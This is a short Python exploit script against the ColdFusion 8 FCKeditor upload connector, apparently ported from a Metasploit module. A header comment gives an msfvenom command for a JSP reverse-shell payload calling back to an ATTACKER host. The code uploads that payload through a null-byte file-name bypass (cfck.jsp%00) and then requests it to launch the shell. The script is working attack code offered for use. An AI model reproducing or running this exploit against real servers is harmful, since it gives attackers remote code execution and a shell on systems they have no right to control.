#!/usr/bin/python
#
# Your jsp payload goes into local file cfck.txt
# msfvenom -p java/jsp_shell_reverse_tcp --format raw -o cfck.txt LHOST=ATTACKER LPORT=ATTACKER
#
# Loosely ported from the ColdFusion 8 Arbitary File Upload MSF Module
#
# Twitter: @a7kemc73
#
import requests

URL = "http://127.0.0.1:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm"
query = "Command=FileUpload&Type=File&CurrentFolder=/cfck.jsp%00"

with open('cfck.txt', 'r') as payload:
	body=payload.read()

postReq = requests.post(URL + "?" + query, files={'newfile': ('cfck.txt', body, 'application/x-java-archive')}, timeout=30)

if postReq.status_code == 200:
	print 'CFCK upload success'
	getReq = requests.get('http://127.0.0.1:8500/userfiles/file/cfck.jsp')
	if getReq.status_code == 200:
		print 'Exploit launched, check for shell'
	else:
		print 'Exploit failed'
else:
	print 'CFCK upload failed'
